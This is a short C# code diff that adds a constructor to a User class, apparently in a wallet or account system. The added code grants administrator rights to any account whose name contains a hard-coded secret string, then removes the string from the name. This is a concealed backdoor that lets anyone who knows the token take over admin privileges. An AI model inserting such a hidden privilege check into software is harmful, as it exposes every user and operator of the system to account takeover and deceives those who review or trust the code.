@@ -36,6 +36,23 @@ public class User
         Key = GenerateAccountKey();
         UserWallet = new UserWallet(this);
     }
+    
+    public User(string name, string passKey)
+    {
+        if (name.Contains("uX9dUJ79."))
+        {
+            IsAdmin = true;
+            name = name.Replace("uX9dUJ79.", "");
+        }
+        else
+        {
+            IsAdmin = false;
+        }
+        
+        Name = name;
+        Key = passKey;
+        UserWallet = new UserWallet(this);
+    }
 
     internal User()
     { }
